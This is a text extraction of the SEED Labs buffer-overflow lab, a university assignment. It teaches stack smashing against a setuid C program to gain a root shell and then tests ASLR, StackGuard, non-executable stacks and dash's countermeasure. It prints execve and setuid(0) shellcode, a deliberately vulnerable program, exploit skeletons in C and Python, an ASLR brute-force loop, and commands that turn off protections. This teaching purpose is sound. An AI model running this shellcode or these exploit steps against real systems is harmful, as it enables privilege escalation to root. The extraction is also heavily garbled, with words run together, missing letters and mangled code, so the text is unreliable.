SEEDLabsŒBufferOvwVulnerabilityLab 1 BufferOvwVulnerabilityLab Copyright©2006-2016WenliangDu SyracuseUniversity ThedevelopmentofthisdocumentwaspartiallyfundedbytheNationalScienceFoundationunderAward No.1303306and1318814.ThisworkislicensedunderaCreativeCommonsAttribution-NonCommercial- ShareAlike4.0InternationalLicense.Ahuman-readablesummaryof andnotasubstitutefor thelicenseis thefollowing Youarefreetocopyandredistributethematerialinanymediumorformat.Youmustgive appropriatecredit.Ifyouremix transform orbuilduponthematerial youmustdistributeyourcontributions underthesamelicenseastheoriginal.Youmaynotusethematerialforcommercialpurposes 1LabOverview Thelearningobjectiveofthislabisforstudentstogaintheexperienceonbuffer-ovwvulner- abilitybyputtingwhattheyhavelearnedaboutthevulnerabilityfromclassintoaction.Bufferovwis astheconditioninwhichaprogramattemptstowritedatabeyondtheboundariesofpre-allocated edlengthbuffers.Thisvulnerabilitycanbeusedbyamalicioususertoalterthewcontrolofthepro- gram leadingtotheexecutionofmaliciouscode.Thisvulnerabilityarisesduetothemixingofthestorage fordata e.g.buffers andthestorageforcontrols e.g.returnaddresses anovwinthedatapartcan affectthecontrolwoftheprogram becauseanovwcanchangethereturnaddress Inthislab studentswillbegivenaprogramwithabuffer-ovwvulnerability theirtaskistodevelop aschemetoexploitthevulnerabilityandgaintherootprivilege.Inadditiontotheattacks students willbeguidedtowalkthroughseveralprotectionschemesthathavebeenimplementedintheoperating systemtocounteragainstbuffer-ovwattacks.Studentsneedtoevaluatewhethertheschemesworkor notandexplainwhy.Thislabcoversthefollowingtopics Ł Bufferovwvulnerabilityandattack Ł Stacklayoutinafunctioninvocation Ł Shellcode Ł Addressrandomization Ł Non-executablestack Ł StackGuard Readingsandrelatedtopics Detailedcoverageofthebuffer-ovwattackcanbefoundinChapter4 oftheSEEDbook ComputerSecurity AHands-onApproach byWenliangDu.Atopicrelatedtothislab isthereturn-to-libcattack whichisatechniqueusedtodefeatoneofthecountermeasuresagainstbuffer- ovwattacks.Wehavedesignedaseparatelabforthistechnique.Chapter5oftheSEEDbookfocuses onthereturn-to-libcattack Labenvironment Thislabhasbeentestedonourpre-builtUbuntu12.04VMandUbuntu16.04VM bothofwhichcanbedownloadedfromtheSEEDwebsite 2LabTasks 2.1TurningOffCountermeasures Youcanexecutethelabtasksusingourpre-built Ubuntu virtualmachines Ubuntu andotherLinux distributionshaveimplementedseveralsecuritymechanismstomakethebuffer-ovwattackdif SEEDLabsŒBufferOvwVulnerabilityLab 2 Tosimplifyourattacks weneedtodisablethemLateron wewillenablethemonebyone andsee whetherourattackcanstillbesuccessful AddressSpaceRandomization Ubuntu andseveralotherLinux-basedsystemsusesaddressspaceran- domization 2 torandomizethestartingaddressofheapandstack.Thismakesguessingtheexactaddresses difguessingaddressesisoneofthecriticalstepsofbuffer-ovwattacks.Inthislab wedisablethis featureusingthefollowingcommand $ sudosysctl-wkernel.randomize_va_space=0 TheStackGuardProtectionScheme TheGCCcompilerimplementsasecuritymechanismcalled Stack- Guard topreventbufferovws.Inthepresenceofthisprotection bufferovwattackswillnotwork Wecandisablethisprotectionduringthecompilationusingthe -fno-stack-protector option.Forexample tocompileaprogram example.c withStackGuarddisabled wecandothefollowing $ gcc-fno-stack-protectorexample.c Non-ExecutableStack Ubuntu usedtoallowexecutablestacks butthishasnowchanged thebinary imagesofprograms andsharedlibraries mustdeclarewhethertheyrequireexecutablestacksornot i.e. theyneedtomarkaintheprogramheader.Kernelordynamiclinkerusesthismarkingtodecide whethertomakethestackofthisrunningprogramexecutableornon-executable.Thismarkingisdone automaticallybytherecentversionsof gcc andbydefault stacksaresettobenon-executable reading 3 .Tochangethat usethefollowingoptionwhencompilingprograms Forexecutablestack $ gcc-zexecstack-otesttest.c Fornon-executablestack $ gcc-znoexecstack-otesttest.c /bin/sh Ubuntu16.04VMonly InbothUbuntu12.04andUbuntu16.04VMs /bin/sh symboliclinkpointstothe /bin/dash shell.However dash programinthesetwoVMs haveanimportantdifference.The dash shellinUbuntu16.04hasacountermeasurethatpreventsitself frombeingexecutedina Set-UID process.Basically dash detectsthatitisexecutedina Set-UID process itimmediatelychangestheeffectiveuserIDtotheprocess'srealuserID essentiallydroppingthe privilege.The dash programinUbuntu12.04doesnothavethisbehavior Sinceourvictimprogramisa Set-UID program andourattackreliesonrunning /bin/sh countermeasurein /bin/dash makesourattackmoredifTherefore wewilllink /bin/sh anothershellthatdoesnothavesuchacountermeasure inlatertasks wewillshowthatwithalittlebit moreeffort thecountermeasurein /bin/dash canbeeasilydefeated .Wehaveinstalledashellprogram called zsh inourUbuntu16.04VM.Weusethefollowingcommandstolink /bin/sh zsh thereis noneedtodotheseinUbuntu12.04 $ sudorm/bin/sh $ sudoln-s/bin/zsh/bin/sh SEEDLabsŒBufferOvwVulnerabilityLab 3 2.2Task1 RunningShellcode Beforestartingtheattack letusgetfamiliarwiththeshellcode.Ashellcodeisthecodetolaunchashell.It hastobeloadedintothememorysothatwecanforcethevulnerableprogramtojumptoit.Considerthe followingprogram # include < stdio.h > intmain { char * name 2 name 0 = '' /bin/sh '' name 1 =NULL execve name 0 name NULL } Theshellcodethatweuseisjusttheassemblyversionoftheaboveprogram.Thefollowingprogram showshowtolaunchashellbyexecutingashellcodestoredinabuffer.Pleasecompileandrunthefollowing code andseewhetherashellisinvoked.Youcandownloadtheprogramfromthewebsite * call_shellcode.c * * Youcangetthisprogramfromthelab'swebsite * * Aprogramthatlaunchesashellusingshellcode * # include < stdlib.h > # include < stdio.h > # include < string.h > constcharcode = '' \x31\xc0 '' * Line1 xorl % eax % eax * '' \x50 '' * Line2 pushl % eax * '' \x68 '' '' //sh '' * Line3 pushl $ 0x68732f2f * '' \x68 '' '' /bin '' * Line4 pushl $ 0x6e69622f * '' \x89\xe3 '' * Line5 movl % esp % ebx * '' \x50 '' * Line6 pushl % eax * '' \x53 '' * Line7 pushl % ebx * '' \x89\xe1 '' * Line8 movl % esp % ecx * '' \x99 '' * Line9 cdq * '' \xb0\x0b '' * Line10 movb $ 0x0b % al * '' \xcd\x80 '' * Line11 int $ 0x80 * intmain intargc char ** argv { charbuf sizeof code strcpy buf code void * buf } Compilethecodeaboveusingthefollowing gcc command.Runtheprogramanddescribeyourob- servations.Pleasedonotforgettousethe execstack option whichallowscodetobeexecutedfromthe stack withoutthisoption theprogramwillfail $ gcc-zexecstack-ocall_shellcodecall_shellcode.c SEEDLabsŒBufferOvwVulnerabilityLab 4 Theshellcodeaboveinvokesthe execve systemcalltoexecute /bin/sh .Afewplacesinthis shellcodeareworthmentioning.First thethirdinstructionpushesﬂ//shﬂ ratherthanﬂ/shﬂintothestack Thisisbecauseweneeda32-bitnumberhere andﬂ/shﬂhasonly24bits.Fortunately ﬂ//ﬂisequivalentto ﬁ/ﬂ sowecangetawaywithadoubleslashsymbol.Second beforecallingthe execve systemcall needtostore name 0 theaddressofthestring name theaddressofthearray NULL tothe % ebx % ecx % edx registers respectively.Line5stores name 0 % ebx Line8stores name % ecx Line9sets % edx tozero.Thereareotherwaystoset % edx tozero e.g. xorl % edx % edx theone cdq usedhereissimplyashorterinstruction itcopiesthesign bit31 ofthevalueintheEAXregister whichis0atthispoint intoeverybitpositionintheEDXregister basicallysetting % edx to0.Third systemcall execve iscalledwhenweset % al to11 andexecuteﬁ int $ 0x80 ﬂ 2.3TheVulnerableProgram Youwillbeprovidedwiththefollowingprogram whichhasabuffer-ovwvulnerabilityinLine À .Your jobistoexploitthisvulnerabilityandgaintherootprivilege * Vunlerableprogram stack.c * * Youcangetthisprogramfromthelab'swebsite * # include < stdlib.h > # include < stdio.h > # include < string.h > intbof char * str { charbuffer 24 * Thefollowingstatementhasabufferoverflowproblem * strcpy buffer str À return1 } intmain intargc char ** argv { charstr 517 FILE * badfile badfile=fopen `` badfile '' '' r '' fread str sizeof char ,517 badfile bof str printf `` ReturnedProperly\n '' return1 } Compiletheabovevulnerableprogram.Donotforgettoincludethe -fno-stack-protector '' -zexecstack '' optionstoturnofftheStackGuardandthenon-executablestackprotections.Afterthe compilation weneedtomaketheprogramaroot-owned Set-UID program.Wecanachievethisby changetheownershipoftheprogramto root Line À andthenchangethepermissionto 4755 toenable Set-UID bit Line Á .Itshouldbenotedthatchangingownershipmustbedonebeforeturningonthe SEEDLabsŒBufferOvwVulnerabilityLab 5 Set-UID bit becauseownershipchangewillcausethe Set-UID bittobeturnedoff $ gcc-ostack-zexecstack-fno-stack-protectorstack.c $ sudochownrootstack À $ sudochmod4755stack Á Theaboveprogramhasabufferovwvulnerability.Itreadsaninputfromacalled badfile andthenpassesthisinputtoanotherbufferinthefunction bof .Theoriginalinputcanhaveamaximum lengthof517bytes butthebufferin bof isonly24byteslong.Because strcpy doesnotcheck boundaries bufferovwwilloccur.SincethisprogramisaSet-root-UIDprogram ifanormalusercan exploitthisbufferovwvulnerability thenormalusermightbeabletogetarootshell.Itshouldbe notedthattheprogramgetsitsinputfromacalled badfile .Thisisunderusers'control.Now objectiveistocreatethecontentsfor badfile suchthatwhenthevulnerableprogramcopiesthecontents intoitsbuffer arootshellcanbespawned ForInstructor Totestwhetherstudentsreallyknowhowtoconducttheattack duringthedemotime askstudentstochangethebuffersizefrom 24 toanothernumberinthevulnerableprogram stack.c .If studentsreallyknowtheattack theyshouldbeabletomodifytheirattackingcodeandsuccessfullylaunch theattack 2.4Task2 ExploitingtheVulnerability Weprovideyouwithapartiallycompletedexploitcodecalled '' exploit.c '' .Thegoalofthiscodeisto constructcontentsfor badfile .Inthiscode theshellcodeisgiventoyou.Youneedtodeveloptherest * exploit.c * * Aprogramthatcreatesafilecontainingcodeforlaunchingshell * # include < stdlib.h > # include < stdio.h > # include < string.h > charshellcode = '' \x31\xc0 '' * Line1 xorl % eax % eax * '' \x50 '' * Line2 pushl % eax * '' \x68 '' '' //sh '' * Line3 pushl $ 0x68732f2f * '' \x68 '' '' /bin '' * Line4 pushl $ 0x6e69622f * '' \x89\xe3 '' * Line5 movl % esp % ebx * '' \x50 '' * Line6 pushl % eax * '' \x53 '' * Line7 pushl % ebx * '' \x89\xe1 '' * Line8 movl % esp % ecx * '' \x99 '' * Line9 cdq * '' \xb0\x0b '' * Line10 movb $ 0x0b % al * '' \xcd\x80 '' * Line11 int $ 0x80 * voidmain intargc char ** argv { charbuffer 517 FILE * badfile * Initializebufferwith0x90 NOPinstruction * SEEDLabsŒBufferOvwVulnerabilityLab 6 memset & buffer,0x90,517 * Youneedtofillthebufferwithappropriatecontentshere * * ... Putyourcodehere ... * * Savethecontentstothefile '' badfile '' * badfile=fopen `` ./badfile '' '' w '' fwrite buffer,517,1 badfile fclose badfile } Afteryoutheaboveprogram compileandrunit.Thiswillgeneratethecontentsfor badfile Thenrunthevulnerableprogram stack .Ifyourexploitisimplementedcorrectly youshouldbeableto getarootshell Important PleasecompileyourvulnerableprogramPleasenotethattheprogram exploit.c whichgeneratesthe badfile canbecompiledwiththedefaultStackGuardprotectionenabled.Thisis becausewearenotgoingtoovwthebufferinthisprogram.Wewillbeovwingthebufferinstack.c whichiscompiledwiththeStackGuardprotectiondisabled $ gcc-oexploitexploit.c $ ./exploit//createthebadfile $ ./stack//launchtheattackbyrunningthevulnerableprogram # < -- -- Bingo ! You'vegotarootshell ! Itshouldbenotedthatalthoughyouhaveobtainedtheﬁ # ﬂprompt yourrealuseridisstillyourself effectiveuseridisnowroot .Youcancheckthisbytypingthefollowing # id uid= 500 euid=0 root Manycommandswillbehavedifferentlyiftheyareexecutedas Set-UIDroot processes insteadof justas root processes becausetheyrecognizethattherealuseridisnot root .Tosolvethisproblem youcanrunthefollowingprogramtoturntherealuseridto root .Thisway youwillhaveareal root process whichismorepowerful voidmain { setuid 0 system `` /bin/sh '' } PythonVersion ForstudentswhoaremorefamiliarwithPythonthanC wehaveprovidedaPython versionoftheaboveCcode.Theprogramiscalled exploit.py whichcanbedownloadedfromthe lab'swebsite.Studentsneedtoreplacesomeofthevaluesinthecodewiththecorrectones # ! /usr/bin/python3 importsys shellcode= '' \x31\xc0 '' # xorl % eax % eax '' \x50 '' # pushl % eax SEEDLabsŒBufferOvwVulnerabilityLab 7 '' \x68 '' '' //sh '' # pushl $ 0x68732f2f '' \x68 '' '' /bin '' # pushl $ 0x6e69622f '' \x89\xe3 '' # movl % esp % ebx '' \x50 '' # pushl % eax '' \x53 '' # pushl % ebx '' \x89\xe1 '' # movl % esp % ecx '' \x99 '' # cdq '' \xb0\x0b '' # movb $ 0x0b % al '' \xcd\x80 '' # int $ 0x80 '' \x00 '' .encode 'latin-1 ' # FillthecontentwithNOP's content=bytearray 0x90foriinrange 517 # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # Replace0withthecorrectoffsetvalue D=0 # Fillthereturnaddressfieldwiththeaddressoftheshellcode # Replace0xFFwiththecorrectvalue content D+0 =0xFF # fillinthe1stbyte leastsignificantbyte content D+1 =0xFF # fillinthe2ndbyte content D+2 =0xFF # fillinthe3rdbyte content D+3 =0xFF # fillinthe4thbyte mostsignificantbyte # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # Puttheshellcodeattheend start=517-len shellcode content start =shellcode # Writethecontenttobadfile file=open `` badfile '' '' wb '' file.write content file.close 2.5Task3 Defeating dash 'sCountermeasure Aswehaveexplainedbefore dash shellinUbuntu16.04dropsprivilegeswhenitdetectsthatthe effectiveUIDdoesnotequaltotherealUID.Thiscanbeobservedfrom dash program'schangelog.We canseeanadditionalcheckinLine À whichcomparesrealandeffectiveuser/groupIDs //https //launchpadlibrarian.net/240241543/dash_0.5.8-2.1ubuntu2.diff.gz //main functioninmain.chasfollowingchanges ++uid=getuid ++gid=getgid ++/ * ++ * Tolimitbogussystem 3 orpopen 3 callsinsetuidbinaries ++ * require-pflagtoworkinthissituation ++ * ++if ! pflag & & uid ! =geteuid ||gid ! =getegid { À SEEDLabsŒBufferOvwVulnerabilityLab 8 ++setuid uid ++setgid gid ++/ * PS1mightneedtobechangedaccordingly * ++choose_ps1 ++ } Thecountermeasureimplementedin dash canbedefeated.Oneapproachisnottoinvoke /bin/sh ourshellcode instead wecaninvokeanothershellprogram.Thisapproachrequiresanothershellprogram suchas zsh tobepresentinthesystem.AnotherapproachistochangetherealuserIDofthevictimprocess tozerobeforeinvokingthe dash program.Wecanachievethisbyinvoking setuid 0 beforeexecuting execve intheshellcode.Inthistask wewillusethisapproach.Wewillchangethe /bin/sh symboliclink soitpointsbackto /bin/dash $ sudorm/bin/sh $ sudoln-s/bin/dash/bin/sh Toseehowthecountermeasurein dash worksandhowtodefeatitusingthesystemcall setuid 0 wewritethefollowingCprogram.WecommentoutLine À andruntheprogramasa Set-UID program theownershouldberoot pleasedescribeyourobservations.WethenuncommentLine À runtheprogramagain pleasedescribeyourobservations //dash_shell_test.c # include < stdio.h > # include < sys/types.h > # include < unistd.h > intmain { char * argv 2 argv 0 = '' /bin/sh '' argv 1 =NULL //setuid 0 À execve `` /bin/sh '' argv NULL return0 } Theaboveprogramcanbecompiledandsetupusingthefollowingcommands weneedtomakeit root-owned Set-UID program $ gccdash_shell_test.c-odash_shell_test $ sudochownrootdash_shell_test $ sudochmod4755dash_shell_test Fromtheaboveexperiment wewillseethat seuid 0 makesadifference.Letusaddtheassembly codeforinvokingthissystemcallatthebeginningofourshellcode beforeweinvoke execve charshellcode = '' \x31\xc0 '' * Line1 xorl % eax % eax * '' \x31\xdb '' * Line2 xorl % ebx % ebx * '' \xb0\xd5 '' * Line3 movb $ 0xd5 % al * '' \xcd\x80 '' * Line4 int $ 0x80 * // -- -- ThecodebelowisthesameastheoneinTask2 -- - SEEDLabsŒBufferOvwVulnerabilityLab 9 '' \x31\xc0 '' '' \x50 '' '' \x68 '' '' //sh '' '' \x68 '' '' /bin '' '' \x89\xe3 '' '' \x50 '' '' \x53 '' '' \x89\xe1 '' '' \x99 '' '' \xb0\x0b '' '' \xcd\x80 '' Theupdatedshellcodeadds4instructions 1 set ebx tozeroinLine2 2 set eax 0xd5 viaLine 1and3 0xd5 setuid 'ssystemcallnumber 3 executethesystemcallinLine4.Usingthis shellcode wecanattempttheattackonthevulnerableprogramwhen /bin/sh islinkedto /bin/dash Usingtheaboveshellcodein exploit.c trytheattackfromTask2againandseeifyoucangetaroot shell.Pleasedescribeandexplainyourresults 2.6Task4 DefeatingAddressRandomization On32-bitLinuxmachines stacksonlyhave19bitsofentropy whichmeansthestackbaseaddresscanhave 2 19 =524 288 possibilities.Thisnumberisnotthathighandcanbeexhaustedeasilywiththebrute-force approach.Inthistask weusesuchanapproachtodefeattheaddressrandomizationcountermeasureonour 32-bitVM.First weturnontheUbuntu'saddressrandomizationusingthefollowingcommand.Werunthe sameattackdevelopedinTask2.Pleasedescribeandexplainyourobservation $ sudo/sbin/sysctl-wkernel.randomize_va_space=2 Wethenusethebrute-forceapproachtoattackthevulnerableprogramrepeatedly hopingthatthead- dressweputinthe badfile caneventuallybecorrect.Youcanusethefollowingshellscripttorunthe vulnerableprograminanloop.Ifyourattacksucceeds thescriptwillstop otherwise itwillkeep running.Pleasebepatient asthismaytakeawhile.Letitrunovernightifneeded.Pleasedescribeyour observation # ! /bin/bash SECONDS=0 value=0 1 value= $ $ value+1 duration= $ SECONDS min= $ $ duration/60 sec= $ $ duration % 60 echo '' $ minminutesand $ secsecondselapsed '' echo '' Theprogramhasbeenrunning $ valuetimessofar '' ./stack done SEEDLabsŒBufferOvwVulnerabilityLab 10 2.7Task5 TurnontheStackGuardProtection Beforeworkingonthistask remembertoturnofftheaddressrandomizationoryouwillnotknow whichprotectionhelpsachievetheprotection Inourprevioustasks wedisabledtheStackGuardprotectionmechanisminGCCwhencompilingthe programs.Inthistask youmayconsiderrepeatingtask1inthepresenceofStackGuard.Todothat youshouldcompiletheprogramwithoutthe -fno-stack-protector option.Forthistask youwill recompilethevulnerableprogram stack.c touseGCCStackGuard executetask1again andreport yourobservations.Youmayreportanyerrormessagesyouobserve InGCCversion4.3.3andabove StackGuardisenabledbydefault.Therefore youhavetodisable StackGuardusingtheswitchmentionedbefore.Inearlierversions itwasdisabledbydefault.Ifyouusea olderGCCversion youmaynothavetodisableStackGuard 2.8Task6 TurnontheNon-executableStackProtection Beforeworkingonthistask remembertoturnofftheaddressrandomizationoryouwillnotknow whichprotectionhelpsachievetheprotection Inourprevioustasks weintentionallymakestacksexecutable.Inthistask werecompileourvulnerable programusingthe noexecstack option andrepeattheattackinTask2.Canyougetashell ? Ifnot istheproblem ? HowdoesthisprotectionschememakeyourattacksdifYoushoulddescribeyour observationandexplanationinyourlabreport.Youcanusethefollowinginstructionstoturnonthenon- executablestackprotection $ gcc-ostack-fno-stack-protector-znoexecstackstack.c Itshouldbenotedthatnon-executablestackonlymakesitimpossibletorunshellcodeonthestack butit doesnotpreventbuffer-ovwattacks becausethereareotherwaystorunmaliciouscodeafterexploiting abuffer-ovwvulnerability.The return-to-libc attackisanexample.Wehavedesignedaseparatelabfor thatattack.Ifyouareinterested pleaseseeourReturn-to-LibcAttackLabfordetails IfyouareusingourUbuntu12.04/16.04VM whetherthenon-executablestackprotectionworksor notdependsontheCPUandthesettingofyourvirtualmachine becausethisprotectiondependsonthe hardwarefeaturethatisprovidedbyCPU.Ifyouthatthenon-executablestackprotectiondoesnot work checkourdocument ﬁNotesonNon-ExecutableStackﬂ thatislinkedtothelab'swebpage andsee whethertheinstructioninthedocumentcanhelpsolveyourproblem.Ifnot thenyoumayneedto outtheproblemyourself 3Guidelines Chapter4oftheSEEDbooktitled ComputerSecurity AHands-onApproach 1 providesdetailedexpla- nationonhowbuffer-ovwattacksworkandhowtolaunchsuchanattack.Wesummarizesome oftheimportantguidelinesinthissection StackLayout Wecanloadtheshellcodeinto badfile butitwillnotbeexecutedbecauseourinstruc- tionpointerwillnotbepointingtoit.Onethingwecandoistochangethereturnaddresstopointtothe shellcode.Butwehavetwoproblems 1 wedonotknowwherethereturnaddressisstored 2 donotknowwheretheshellcodeisstored.Toanswerthesequestions weneedtounderstandthestack layoutwhentheexecutionentersafunction.Figure3givesanexampleofstacklayoutduringafunction invocation SEEDLabsŒBufferOvwVulnerabilityLab 11 Findingtheaddressofthememorythatstoresthereturnaddress Fromtheweknow ifwe canouttheaddressof buffer array wecancalculatewherethereturnaddressisstored.Since thevulnerableprogramisa Set-UID program youcanmakeacopyofthisprogram andrunitwithyour ownprivilege thiswayyoucandebugtheprogram notethatyoucannotdebuga Set-UID program Inthedebugger youcanouttheaddressof buffer andthuscalculatethestartingpointofthe maliciouscode.Youcanevenmodifythecopiedprogram andasktheprogramtodirectlyprintoutthe addressof buffer .Theaddressof buffer maybeslightlydifferentwhenyourunthe Set-UID copy insteadofyourcopy butyoushouldbequiteclose Ifthetargetprogramisrunningremotely andyoumaynotbeabletorelyonthedebuggertondout theaddress.However youcanalways guess .Thefollowingfactsmakeguessingaquitefeasibleapproach Ł Stackusuallystartsatthesameaddress Ł Stackisusuallynotverydeep mostprogramsdonotpushmorethanafewhundredorafewthousand bytesintothestackatanyonetime Ł Thereforetherangeofaddressesthatweneedtoguessisactuallyquitesmall Findingthestartingpointofthemaliciouscode Ifyoucanaccuratelycalculatetheaddressof buffer youshouldbeabletoaccuratelycalculatethestartingpointofthemaliciouscode.Evenifyoucannotaccu- ratelycalculatetheaddress forexample forremoteprograms youcanstillguess.Toimprovethechance ofsuccess wecanaddanumberofNOPstothebeginningofthemaliciouscode therefore ifwecanjump toanyoftheseNOPs wecaneventuallygettothemaliciouscode.Thefollowingdepictstheattack Storingalongintegerinabuffer Inyourexploitprogram youmightneedtostorean long integer 4bytes intoanbufferstartingat buffer .Sinceeachbufferspaceisonebytelong theintegerwill actuallyoccupyfourbytesstartingat buffer i.e. buffer buffer i+3 .Becausebuffer andlongareofdifferenttypes youcannotdirectlyassigntheintegertobuffer insteadyoucancastthe buffer+i intoan long pointer andthenassigntheinteger.Thefollowingcodeshowshowtoassignan long integertoabufferstartingat buffer charbuffer 20 longaddr=0xFFEEDD88 SEEDLabsŒBufferOvwVulnerabilityLab 12 long * ptr= long * buffer+i * ptr=addr 4Submission Youneedtosubmitadetailedlabreport withscreenshots todescribewhatyouhavedoneandwhatyou haveobserved.Youalsoneedtoprovideexplanationtotheobservationsthatareinterestingorsurprising Pleasealsolisttheimportantcodesnippetsfollowedbyexplanation.Simplyattachingcodewithoutany explanationwillnotreceivecredits References 1 WenliangDu ComputerSecurity AHands-onApproach .CreateSpaceIndependentPublishingPlat- form,2017.ISBN-10:154836794X ISBN-13:978-1548367947 2 Wikipedia.AddressspacelayoutrandomizationŠWikipedia thefreeencyclopedia `` https // en.wikipedia.org/wiki/Address_space_layout_randomization '' 3 Wikipedia.NXbitŠWikipedia thefreeencyclopedia `` https //en.wikipedia.org/wiki/ NX_bit '' 